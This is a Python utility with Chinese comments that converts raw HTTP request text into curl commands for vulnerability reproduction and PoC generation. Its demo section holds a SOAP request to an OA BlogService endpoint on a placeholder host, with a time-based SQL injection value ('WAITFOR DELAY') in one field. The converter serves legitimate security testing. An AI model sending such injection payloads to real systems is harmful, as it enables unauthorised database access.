from typing import Dict, List, Optional
from urllib.parse import urlparse, urljoin

class RawHttpToCurl:
    """
    将 原始 HTTP 请求包 + 明确的 URL
    转换为可执行的 curl 命令

    适用场景：
    - 漏洞请求复现
    - 攻防 PoC 生成
    - 抓包请求标准化
    """

    def __init__(
        self,
        url: str,
        raw_http: str,
        *,
        drop_headers: Optional[List[str]] = None,
        mask_headers: Optional[List[str]] = None,
    ):
        """
        :param url: 明确的 URL（含 http/https）
        :param raw_http: 原始 HTTP 请求包文本
        :param drop_headers: 需要丢弃的 header（如 Content-Length）
        :param mask_headers: 需要脱敏的 header（如 Authorization）
        """
        self.url = url.rstrip("/")
        self.raw_http = raw_http
        self.drop_headers = set(h.lower() for h in (drop_headers or []))
        self.mask_headers = set(h.lower() for h in (mask_headers or []))

        self.method: str = ""
        self.path: str = ""
        self.headers: Dict[str, str] = {}
        self.body: str = ""

        self._parse_raw_http()

    def _parse_raw_http(self) -> None:
        lines = self.raw_http.strip("\n").splitlines()
        if not lines:
            raise ValueError("Empty raw HTTP request")

        # 请求行
        try:
            self.method, self.path, _ = lines[0].split(" ", 2)
        except ValueError:
            raise ValueError(f"Invalid request line: {lines[0]}")

        is_body = False
        body_lines = []

        for line in lines[1:]:
            if not is_body:
                if line.strip() == "":
                    is_body = True
                    continue

                if ":" not in line:
                    continue

                k, v = line.split(":", 1)
                header_name = k.strip()
                header_value = v.strip()

                if header_name.lower() in self.drop_headers:
                    continue

                if header_name.lower() in self.mask_headers:
                    header_value = "***MASKED***"

                self.headers[header_name] = header_value
            else:
                body_lines.append(line)

        self.body = "\n".join(body_lines).strip()

    def to_curl(self, pretty: bool = True) -> str:
        """
        生成 curl 命令
        """
        url = self._build_url()

        parts = [
            f"curl '{url}'",
            f"-X {self.method}",
        ]

        for k, v in self.headers.items():
            parts.append(f"-H '{k}: {v}'")

        if self.body:
            parts.append(f"--data '{self.body}'")

        if pretty:
            return " \\\n  ".join(parts)

        return " ".join(parts)

    def to_curl_args(self) -> List[str]:
        """
        生成符合 curl_exec.py 入参格式的 curl 参数列表
        
        返回:
            List[str]: curl 参数列表（不含 "curl" 命令本身）
        """
        url = self._build_url()
        
        args = [
            url,
            "-X", self.method,
        ]
        
        for k, v in self.headers.items():
            args.extend(["-H", f"{k}: {v}"])
        
        if self.body:
            args.extend(["--data", self.body])
            
        return args

    def _build_url(self) -> str:
        """
        构造最终请求 URL
        兼容：
        - url 含目录路径
        - raw path 绝对 / 相对
        - raw path 为完整 URL
        """
        path = self.path.strip()

        # 规则 3：raw request 里已经是完整 URL
        if path.startswith("http://") or path.startswith("https://"):
            return path

        base = self.url

        # 确保 base 是目录形式，方便 urljoin
        if not base.endswith("/"):
            base = base + "/"

        # urljoin 自动处理 / 覆盖规则
        return urljoin(base, path)


if __name__ == "__main__":

    raw_http = """POST /services/BlogService HTTP/1.1
Host: demo-target.example.com:8443
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Mozilla/3.1415926
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Referer: https://demo-target.example.com:8443
Cache-Control: max-age=0
Content-Type: text/xml;charset=UTF-8
Soapaction: 
Content-Length: 387

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="oa.example.com">
   <soapenv:Header/>
   <soapenv:Body>
      <web:writeBlogReadFlag>
         <web:string>1</web:string>
         <web:string>2 WAITFOR DELAY '0:0:0'</web:string>
         <web:string></web:string>
      </web:writeBlogReadFlag>
   </soapenv:Body>
</soapenv:Envelope>
    """

    ourl = "https://demo-target.example.com:8443/services/BlogService"
    converter = RawHttpToCurl(
        url=ourl,
        raw_http=raw_http,
    )
    
    print("=== 传统 curl 命令格式 ===")
    print(converter.to_curl())
    
    print("\n=== curl_exec.py 入参格式 ===")
    curl_args = converter.to_curl_args()
    print("curl_args:", curl_args)
    
    # 模拟发送到 curl_exec 服务的请求
    print("\n=== 模拟 curl_exec.py 请求 ===")
    request_data = {
        "curl_args": curl_args,
        "timeout": 15
    }
    print("请求数据:", request_data)

